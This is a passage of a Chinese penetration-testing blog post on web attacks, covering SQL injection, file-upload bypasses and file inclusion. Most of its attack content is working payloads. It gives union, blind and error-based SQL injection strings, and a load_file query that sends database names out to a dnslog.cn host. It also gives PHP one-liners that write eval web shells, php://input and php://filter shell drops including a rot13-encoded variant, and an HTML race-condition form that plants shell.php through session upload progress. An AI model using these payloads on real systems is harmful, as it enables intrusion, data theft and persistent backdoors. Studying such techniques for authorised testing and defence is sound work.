+<p>其他步骤基本一样，只是在最后查询数据时需要加上数据库名这个条件，如</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id <span class="operator">=</span> <span class="number">1.111</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,username,<span class="number">6</span> <span class="keyword">from</span> Adb.admin limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h3><p>需要root权限的用户，还需要没有进行secure-file-priv的设置，高版本默认将它设置死了，所以这个利用点就很少了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,load_file(<span class="string">&#x27;d:\\1.txt&#x27;</span>),<span class="number">6</span>; #读取绝对路径下的文件内容</span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="string">&#x27;写入的内容&#x27;</span>,<span class="number">6</span> <span class="keyword">into</span> outfile <span class="string">&#x27;D:\\1.txt&#x27;</span>; #将内容写入指定的绝对路径</span><br></pre></td></tr></table></figure>
+
+<p>但是如果我们想要访问到我们写入的文件，就必须知道网站的绝对路径，一般可以通过网上公开的一些路径读取一些配置文件来获取，获取在一些情况下通过网站报错来获取路径</p>
+<p>mysq可以识别16进制，如果禁用了单引号，可以将内容转为16进制然后前面加上0x即可，不在需要单引号</p>
+<h3 id="数据请求"><a href="#数据请求" class="headerlink" title="数据请求"></a>数据请求</h3><p>SQL 语句由于在黑盒中是无法预知写法的，SQL 注入能成功是需要拼接原 SQL 语句，大部分黑盒能做的就是分析后各种尝试去判断，所以有可能出现有注入但无法注入成功的情况，究其原因大部分都是原 SQL 语句的未知性导致的拼接失败，也就是开发者对于数据类型和 SQL 语句写法（框架写法）导致 SQL 注入拼接失败</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 数字型 (无符号干扰)</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>$id;</span><br><span class="line"># 字符型（有符号干扰）</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span>;</span><br><span class="line"># 搜索型（有多符号干扰）</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id <span class="keyword">like</span> <span class="string">&#x27;%$id%&#x27;</span></span><br><span class="line"># 框架型（有各种符号干扰）</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> id<span class="operator">=</span>(<span class="string">&#x27;$id&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> news <span class="keyword">where</span> (id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>全局变量方法：GET、POST、SERVER、FILES、HTTP头等</p>
+<p>User-Agent：使得服务器能够识别客户使用的操作系统，游览器版本等（很多数据量大的网站中会记录客户使用的操作系统或浏览器版本等存入数据库中）<br>Cookie：网站为了辨别用户身份、进行 session 跟踪而储存在用户本地终端上的数据<br>X-Forwarded-For：简称 XFF 头，它代表客户端，也就是 HTTP 的请求端真实的 IP，通常一些网站的防注入功能会记录请求端真实 IP 地址并写入数据库，是PHP特性<br>Rerferer：浏览器向 WEB 服务器表明自己是从哪个页面链接过来的<br>Host：客户端指定自己想访问的 WEB 服务器的域名&#x2F;IP 地址和端口号</p>
+<h3 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#查询</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> 表名 <span class="keyword">where</span> id<span class="operator">=</span>$id</span><br><span class="line">#增加：</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> 表名 (`字段名<span class="number">1</span>`,`字段名<span class="number">2</span>`) <span class="keyword">VALUES</span> (<span class="string">&#x27;数据1&#x27;</span>,<span class="string">&#x27;数据2&#x27;</span>)</span><br><span class="line">#删除</span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> 表名 <span class="keyword">WHERE</span> id<span class="operator">=</span>$id</span><br><span class="line">#修改</span><br><span class="line"><span class="keyword">UPDATE</span> 表名 <span class="keyword">SET</span> id<span class="operator">=</span>$id <span class="keyword">where</span> 条件</span><br></pre></td></tr></table></figure>
+
+<h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>盲注就是在注入过程中，获取的数据不能回显至前端页面，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>
+<p>盲注大致分为以下三类：</p>
+<p>1、基于布尔的 SQL 盲注—逻辑判断，需要有数据库是否正常输出作为标准判断</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#常用函数：regexp,<span class="keyword">like</span>,ascii,<span class="keyword">left</span>,ord,mid</span><br><span class="line"><span class="keyword">and</span> length(database())<span class="operator">=</span><span class="number">7</span>;</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">left</span>(database(),<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;p&#x27;</span>;</span><br><span class="line"><span class="keyword">and</span> <span class="keyword">left</span>(database(),<span class="number">2</span>)<span class="operator">=</span><span class="string">&#x27;pi&#x27;</span>;</span><br><span class="line"><span class="keyword">and</span> substr(database(),<span class="number">1</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;p&#x27;</span>;</span><br><span class="line"><span class="keyword">and</span> substr(database(),<span class="number">2</span>,<span class="number">1</span>)<span class="operator">=</span><span class="string">&#x27;i&#x27;</span>;</span><br><span class="line"><span class="keyword">and</span> ord(<span class="keyword">left</span>(database(),<span class="number">1</span>))<span class="operator">=</span><span class="number">112</span>;</span><br></pre></td></tr></table></figure>
+
+<p>2、基于时间的 SQL 盲注—延时判断</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#常用函数：if,sleep</span><br><span class="line"><span class="keyword">and</span> sleep(<span class="number">1</span>);</span><br><span class="line"><span class="keyword">and</span> if(<span class="number">1</span><span class="operator">&gt;</span><span class="number">2</span>,sleep(<span class="number">1</span>),<span class="number">0</span>);</span><br><span class="line"><span class="keyword">and</span> if(<span class="number">1</span><span class="operator">&lt;</span><span class="number">2</span>,sleep(<span class="number">1</span>),<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
+
+<p>3、基于报错的 SQL 盲注—报错回显</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#常用函数：floor，updatexml，extractvalue</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>) #<span class="number">0x7e</span>是波浪符</span><br><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, concat(<span class="number">0x5c</span>, (<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables limit <span class="number">1</span>)));</span><br></pre></td></tr></table></figure>
+
+<p>函数解释：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">like</span> <span class="string">&#x27;ro%&#x27;</span> # 判断ro或ro。。。是否成立</span><br><span class="line">regexp <span class="string">&#x27;qax[a-z]&#x27;</span> #匹配qax或qax。。。（a<span class="operator">-</span>z）</span><br><span class="line">if(条件,<span class="number">5</span>,<span class="number">0</span>) #条件成立返回<span class="number">5</span>否则返回<span class="number">0</span></span><br><span class="line">sleep(<span class="number">5</span>) #延时<span class="number">5</span>秒</span><br><span class="line">mid(a,b,c) #从b位置开始，截取字符串a的c位</span><br><span class="line">substr(a,b,c) #从b位置开始，截取字符串a的c个长度</span><br><span class="line"><span class="keyword">left</span>(a,b) #从左侧截取a的前b位</span><br><span class="line">length(database())<span class="operator">=</span><span class="number">8</span> #库名长度为<span class="number">8</span>位</span><br><span class="line">ord() #返回第一个字符的ascii码</span><br></pre></td></tr></table></figure>
+
+<p>如果有mysqli_error()这种报错可以优先使用报错注入；如果只返回规定好的内容提示，如果删除成功或者删除失败，这种需要延时注入；如果返回接收的结果，无论正确还是错误，可以使用布尔注入</p>
+<h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p><img src="/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/image-20240218214113548.png" alt="image-20240218214113548"></p>
+<p>二次注入无非就是在写入时是一个sql语句，但是代码会通过魔术方法等操作，比如给你的单引号加上\来给你转义掉，但是当它存储到数据库时肯定是没有这个\的，但是当你进行其他操作调用到你个sql语句时，不会调用魔术方法，因此你的单引号生效，造成注入</p>
+<p>举个例子，比如现在有一个用户注册的功能点，我们将用户名写为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; and updatexml(1,concat(0x7e,(select version()),0x7e),1)#</span><br></pre></td></tr></table></figure>
+
+<p>在进行注册时，为了保证注册成功，代码里使用了魔术方法addslashes()，所以数据库中执行的插入语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (username,password) <span class="keyword">VALUES</span> (<span class="string">&#x27;admin\&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>)#<span class="string">&#x27;,&#x27;</span><span class="number">123456</span><span class="string">&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<p>当执行其他操作比如密码重置时，就会对我们的用户名进行查询，执行语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span><span class="operator">*</span><span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">select</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure>
+
+<p>此时，造成报错注入，我们称之为二次注入</p>
+<p>黑盒思路：分析功能有添加后对数据操作的地方（功能点），一般很难测出来<br>白盒思路：insert 后进入 select 或 update 的功能的代码块<br>注入条件：插入时有转义函数或配置，后续有利用插入的数据</p>
+<h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>堆叠注入触发的条件很苛刻，因为堆叠注入原理就是通过结束符同时执行多条 sql 语句，例如 php 中的 mysqli_multi_query 函数。与之相对应的 mysqli_query()只能执行一条 SQL，所以要想目标存在堆叠注入,在目标主机存在类似于mysqli_multi_query()这样的函数,根据数据库类型决定是否支持多条语句执行</p>
+<p>条件：</p>
+<p>1、目标存在 sql 注入漏洞<br>2、目标未对”;”号进行过滤<br>3、目标中间层查询数据库信息时可同时执行多条 sql 语句<br>支持堆叠数据库：MYSQL MSSQL Postgresql 等</p>
+<p>如：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> admin <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>;<span class="keyword">create</span> <span class="keyword">table</span> test(username <span class="type">varchar</span>(<span class="number">255</span>));</span><br></pre></td></tr></table></figure>
+
+<p>这样就会出现一个新建的表test，有一个username的字段</p>
+<h3 id="带外注入"><a href="#带外注入" class="headerlink" title="带外注入"></a>带外注入</h3><p>注入条件：ROOT 高权限且支持 load_file()，有部分注入点是没有回显的，所有读取也是没回显的，采用带外</p>
+<p>使用平台： <a target="_blank" rel="noopener" href="http://ceye.io/">http://ceye.io</a> ， <a target="_blank" rel="noopener" href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;//&#x27;</span>,(<span class="keyword">select</span> database()),<span class="string">&#x27;.xxx.dnslog.cn&#x27;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p>数据会拼接外带</p>
+<p>mysql里面的注入多种多样，比如对值进行了base64编码、传参值为json格式等等，但是本质并没有多大区别，这里推荐过一遍sql-lab的靶场就了解的差不多了</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h3 id="原生态"><a href="#原生态" class="headerlink" title="原生态"></a>原生态</h3><p>一定要注意：如果无文件解析漏洞的话，格式解析是一对一的（不能 jpg 解析 php），换句话来说有解析错误配置或后缀解析漏洞时才能实现格式差异解析。文件上传安全指的是攻击者通过利用上传实现后门的写入连接后门进行权限控制的安全问题，对于如何确保这类安全问题，一般会从原生态功能中的文件内容，文件后缀，文件类型等方面判断，但是漏洞可能不仅在本身的代码验证逻辑中出现安全问题，也会在语言版本，语言函数，中间件，引用的第三方编辑器等存在缺陷地方配合利用。另外文件上传也有多个存储逻辑，不同的文件存储方案也会给攻击者带来不一样的挑战</p>
+<p>对于前端JS检测，可以看前端代码是否有检测代码或者直接抓包，看检测后缀是否有数据包发过来，没有的话就是JS检测，绕过方式一般为禁用JS或者先上传允许的格式然后抓包修改</p>
+<p>对于Apache，存在一个.htaccess配置文件，当我们上传一个.htaccess文件，内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .png</span><br></pre></td></tr></table></figure>
+
+<p>这样，你的png后缀的文件就会以php的形式进行解析</p>
+<p>对于针对Content-Type这种类型检测，绕过方法就是直接上传允许的类型，然后抓包改后缀即可</p>
+<p>对于文件头的检测，可以通过图片马的方式绕过，因为检测的是文件头</p>
+<p>对于文件后缀的黑名单检测，只要不在名单里面就可以通过，一般这种会把不合法的后缀替换为空，如果没有循环替换的话，可以通过比如pphphp，这样替换为空的话，就会变成php，依旧可以绕过，或者可以通过大小写绕过（针对于Windows），或者是php3、phtml等后缀，可以通过fuzz方式检测</p>
+<p>由于PHP内核是由C语言实现的，对于PHP版本低于5.3.4，magic_quotes_gpc&#x3D;Off，可以通过00截断，比如在提交时你知道它保存的目录，比如是GET请求，就可以&#x2F;upload&#x2F;1.php%00，这样%00后面的内容就被截断了；如果为POST请求，加上%00之后要选中然后进行URL-decode，或者写一个a，然后在Hex里面找到它，为61，然后修改为00</p>
+<p>对于逻辑方面的绕过，可以通过条件竞争的方式绕过，比如代码逻辑是先上传后检测，所有当文件被上传的同时，只要我们能够访问的这个文件，并且文件中存在访问后立即生成后门的代码，这样即便本身被删除，依旧会有恶意文件存放到这个服务器上</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;2.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_REQUEST[2]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>通过burp的爆破模块，先不断的访问，再不断的上传，选择Null payload，Continue indefinitely，开始爆破即可</p>
+<p>对于二次渲染，可以通过010Editor工具，先上传一张图片，然后将图片下载，通过010打开两张图片，然后对比，然后将恶意代码写到保留的部分即可，或者使用GIF的图片马，一般不会被渲染掉</p>
+<p>对于一些函数漏洞，如move_uploaded_file，需要可控保存的文件名，将文件名改为 shell.php&#x2F;. ，这样就可以绕过</p>
+<h3 id="拓展类"><a href="#拓展类" class="headerlink" title="拓展类"></a>拓展类</h3><p>像Apache HTTPD，有一些文件上传的漏洞，但是很鸡肋，需要满足一些苛刻的条件，可以去vulhub去做做靶场就行，实际环境很难遇到</p>
+<p>还有诸如nginx解析漏洞这些，几乎都是配置问题</p>
+<p>还有一些像是UEditor这种编辑器，也会有一些文件上传的漏洞</p>
+<h3 id="安全架构类"><a href="#安全架构类" class="headerlink" title="安全架构类"></a>安全架构类</h3><p>目录控制：限制执行这种，可以上传但是禁止执行代码</p>
+<p>解码还原：比如将图片进行base64编码，加载时解码还原，一般浏览器中Request URL是data:image&#x2F;png;base64这种，后端代码一般为</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$base64data</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmpFilePath</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;data:image/jpeg;base64,&#x27;</span>.<span class="variable">$base64data</span>.<span class="string">&#x27;&quot; alt=&quot;上传图片&quot;&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>内容通过前面的协议进行解析，不再关注后缀</p>
+<p>分站存储：文件上传到另一台存储服务器</p>
+<p>OSS对象：通过阿里云等云服务的OSS存储服务来存储，Access控制–OSS对象存储–Bucket对象</p>
+<p>目前随着架构的改变，文件上传漏洞越来越少</p>
+<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>程序开发人员通常会把可重复使用的函数写到单个文件中，在使用某些函数时，直接调用此文件，而无须再次编写，这种调用文件的过程一般被称为文件包含。在文件包含中，被包含的文件内容会被当做当前脚本语言去执行代码，比如一个1.txt中写了phpinfo()，然后通过一个index.php文件去包含1.txt，那么phpinfo()代码会被以php方式执行</p>
+<p>相关函数：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PHP：include、require、include_once、require_once 等</span><br><span class="line">					include 在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行</span><br><span class="line">					require 函数出现错误的时候，会直接报错并退出程序的执行</span><br><span class="line">Java：java.io.File、java.io.FileReader 等</span><br><span class="line">ASP.NET：System.IO.FileStream、System.IO.StreamReader 等</span><br></pre></td></tr></table></figure>
+
+<p>所以如果使用了文件包含的函数且包含的文件可控，就可能存在漏洞</p>
+<p>分类：本地包含-Local File Include-LFI，远程包含-Remote File Include-RFI，差异原因是由代码过滤和环境配置文件开关决定，不过现在一般都是本地包含，远程包含默认是关闭的</p>
+<p>利用：可以上传文件的话，通过上传文件，内容写恶意代码；但大多数是我们无法上传文件，这时需要通过：包含日志文件利用、包含session文件利用、伪协议利用</p>
+<h3 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h3><p>关于PHP的伪协议，参考： <a target="_blank" rel="noopener" href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p>
+<p><img src="https://img2018.cnblogs.com/i-beta/1853528/201911/1853528-20191106132336991-1666925658.png" alt="img"></p>
+<p>文件读取： file直接读取文件，需要绝对路径；而php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;可以使用相对路径</p>
+<p>文件写入： php:&#x2F;&#x2F;input可以写入文件也可以直接执行代码，POST传入内容，如：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  访问http://127.0.0.1/include.php?file=php://input</span></span><br><span class="line"><span class="comment">//  然后POST传入以下内容</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>php:&#x2F;&#x2F;filter&#x2F;write也可以写入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=convert.base64-decode/resource=123.php</span><br><span class="line">然后post传入以下内容</span><br><span class="line">content=base64编码值</span><br></pre></td></tr></table></figure>
+
+<p>访问123.php即可</p>
+<p>当然除了这种base64编码外，还可以通过凯撒13的方式，因为php内置了这种方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php://filter/write=string.rot13/resource=2.php</span><br><span class="line">content=&lt;?cuc riny($_CBFG[1]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>代码执行： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php://input</span><br><span class="line">data://text/plain,&lt;?php phpinfo();?&gt;</span><br><span class="line">data://text/plain;base64,xxxxxxxxxx</span><br><span class="line">php执行系统命令：&lt;?php system(&#x27;ls&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="日志包含"><a href="#日志包含" class="headerlink" title="日志包含"></a>日志包含</h3><p>通过 file:&#x2F;&#x2F; 直接读取日志文件，一般日志文件会记录一些请求头如UA，这样我们抓包，将UA改为要执行的代码，然后直接包含这个日志文件即可，像Linux采用nginx搭建的php站点，日志文件路径为：&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
+<h3 id="SESSION包含"><a href="#SESSION包含" class="headerlink" title="SESSION包含"></a>SESSION包含</h3><p>需要先去控制一个session的名字，可以通过表单提交，但是session内容默认会被清空，这时需要条件竞争，和文件上传类似，需要在内容清空之前访问这个session使其执行里面的代码，生成恶意文件</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://xxxxxxxx/&quot;</span> <span class="attr">nethod</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;)?&gt;&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>随便上传一个文件，提交时抓包，然后在请求头Cookie处修改： Cookie: PHPSESSID&#x3D;qax，然后通过file伪协议访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxxxxx/?file=/tmp/sess_qax</span><br></pre></td></tr></table></figure>
+
+<p>发现这个session存在，然后通过条件竞争，先不断的访问这个session，然后再不断的去提交，最终访问shell.php即可</p>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="https://ink-scholar.github.io/2024/02/17/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8A)/" title="渗透测试--WEB攻防(上)" target="_blank" rel="external">https://ink-scholar.github.io/2024/02/17/渗透测试--WEB攻防(上)/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/ink-scholar" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/ink-scholar" target="_blank"><span class="text-dark">ink</span><small class="ml-1x">就职于奇安信的00后安全研究员</small></a></h3>
+        <div>一招鲜？更喜欢百招全，立志成为全栈安全大牛。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2024/02/19/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--WEB%E6%94%BB%E9%98%B2(%E4%B8%8B)/" title="渗透测试--WEB攻防(下)"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2024/02/07/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91(%E4%B8%8B)/" title="渗透测试--安全开发(下)"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn " data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button">    <span>[&nbsp;</span><span>Catalogue</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>$</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
